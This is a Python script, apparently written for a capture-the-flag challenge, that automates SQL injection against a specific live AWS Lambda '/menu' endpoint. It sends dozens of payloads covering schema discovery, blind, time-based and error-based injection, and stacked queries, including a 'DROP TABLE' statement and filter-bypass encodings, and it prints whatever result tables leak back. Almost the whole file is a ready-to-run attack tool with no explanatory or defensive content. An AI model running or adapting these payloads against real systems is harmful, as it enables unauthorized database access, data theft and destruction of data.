import requests
from bs4 import BeautifulSoup
import time
import urllib.parse

def send_request(payload):
    url = "https://2rjg3a6m46nvm4lsdjdqbtczjy0fasoe.lambda-url.us-east-2.on.aws/menu"
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://2rjg3a6m46nvm4lsdjdqbtczjy0fasoe.lambda-url.us-east-2.on.aws',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    data = {'query': payload}
    return requests.post(url, headers=headers, data=data)

def parse_response(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    results = []
    table = soup.find('table')
    if table:
        rows = table.find_all('tr')[1:]  # Skip header
        for row in rows:
            cols = row.find_all('td')
            if cols:
                results.append([col.text.strip() for col in cols])
    return results

def test_payload(payload, description=""):
    print(f"\nTesting: {description}")
    print(f"Payload: {payload}")
    try:
        response = send_request(payload)
        results = parse_response(response)
        print(f"Status: {response.status_code}")
        if results:
            print("Results found:", results)
            return results
        print("No results found")
        return None
    except Exception as e:
        print(f"Error: {str(e)}")
        return None

# Different payload categories
def generate_schema_discovery_payloads():
    return [
        # Try to extract schema information
        "' OR EXISTS (SELECT * FROM information_schema.tables)--",
        "' OR EXISTS (SELECT * FROM sqlite_master)--",  # SQLite
        "' OR EXISTS (SELECT * FROM pg_tables)--",      # PostgreSQL
        "' OR EXISTS (SELECT * FROM mysql.user)--",     # MySQL
        
        # Try different table names
        "' OR EXISTS (SELECT * FROM users)--",
        "' OR EXISTS (SELECT * FROM admin)--",
        "' OR EXISTS (SELECT * FROM secrets)--",
        "' OR EXISTS (SELECT * FROM flags)--",
        "' OR EXISTS (SELECT * FROM special_menu)--",
        "' OR EXISTS (SELECT * FROM sanitizer_items)--",
        
        # Try to extract version information
        "' OR 1=1 AND @@version>0--",         # SQL Server
        "' OR 1=1 AND version()>0--",         # PostgreSQL
        "' OR 1=1 AND sqlite_version()>0--",  # SQLite
    ]

def generate_blind_payloads():
    return [
        # Blind boolean tests
        "' OR (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2)x)>0--",
        "' OR (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x)>0--",
        
        # Time-based blind tests
        "'; WAITFOR DELAY '0:0:1'--",  # SQL Server
        "'; SELECT pg_sleep(1)--",      # PostgreSQL
        "'; SELECT SLEEP(1)--",         # MySQL
        
        # Conditional time delays
        "'; IF (EXISTS (SELECT * FROM users)) WAITFOR DELAY '0:0:1'--",
        "'; SELECT CASE WHEN (EXISTS (SELECT * FROM flags)) THEN pg_sleep(1) ELSE pg_sleep(0) END--",
    ]

def generate_error_based_payloads():
    return [
        # Force different types of errors
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND 1=CAST((SELECT user) AS int)--",
        "' AND 1=CAST((SELECT CURRENT_USER) AS int)--",
        
        # XML path injection
        "' AND 1=1 AND xml_type=1--",
        "' AND 1=1 AND xml=1--",
        
        # Arithmetic errors
        "' AND 1=(SELECT 1/0 FROM users)--",
        "' AND 1=(SELECT TOP 1 CASE WHEN 1=1 THEN 1/0 ELSE NULL END FROM users)--",
    ]

def generate_stacked_queries():
    return [
        # Try different delimiters
        "'; SELECT * FROM users;--",
        "'; INSERT INTO logs VALUES('test');--",
        "'; DROP TABLE temp;--",
        
        # Multiple statements
        "'; CREATE TABLE temp(id int);--",
        "'; DECLARE @tmp TABLE(id int);--",
        
        # Using GO (SQL Server)
        "'; SELECT @@version GO--",
    ]

def generate_special_characters():
    special_chars = ['¿', '浣', '说', '€', '£', '»', '«', '°', 'µ', '®', '©']
    return [
        f"' OR dish LIKE '%{char}%'--" for char in special_chars
    ]

def main():
    all_payloads = []
    all_payloads.extend(generate_schema_discovery_payloads())
    all_payloads.extend(generate_blind_payloads())
    all_payloads.extend(generate_error_based_payloads())
    all_payloads.extend(generate_stacked_queries())
    all_payloads.extend(generate_special_characters())
    
    # Add some creative combination payloads
    all_payloads.extend([
        # Try to bypass filters
        "'\tOR\t1=1--",
        "'\nOR\n1=1--",
        "'/**/OR/**/1=1--",
        
        # Try different encodings
        urllib.parse.quote("' OR 1=1--"),
        urllib.parse.quote_plus("' OR 1=1--"),
        
        # Try double-encoded quotes
        "%2527%20OR%201=1--",
        
        # Try different case combinations
        "' oR 1=1--",
        "' Or 1=1--",
        "' OR 1=1--",
        
        # Try with different spaces
        "'%09OR%091=1--",
        "'%0AOR%0A1=1--",
        "'%0DOR%0D1=1--",
        
        # Try alternative TRUE conditions
        "' OR 'a'='a'--",
        "' OR 3>=3--",
        "' OR 'min'='min'--",
        
        # Try to change response format
        "' OR 1=1 ORDER BY 1--",
        "' OR 1=1 ORDER BY 2--",
        "' OR 1=1 ORDER BY 3--",
        "' OR 1=1 GROUP BY dish--",
        
        # Try to force different joins
        "' OR 1=1 AND EXISTS(SELECT 1)--",
        "' OR dish IN (SELECT 'min')--",
        
        # Try different comment styles
        "' OR 1=1/*",
        "' OR 1=1#",
        "' OR 1=1-- -",
        "' OR 1=1--+",
    ])
    
    print("Starting advanced SQL injection tests...")
    unique_results = set()
    
    for payload in all_payloads:
        results = test_payload(payload)
        if results:
            results_tuple = tuple(tuple(row) for row in results)
            unique_results.add(results_tuple)
        time.sleep(0.5)  # Be nice to the server
    
    print("\nSummary of unique result sets found:")
    for i, result_set in enumerate(unique_results, 1):
        print(f"\nUnique Result Set {i}:")
        for row in result_set:
            print(row)

if __name__ == "__main__":
    main()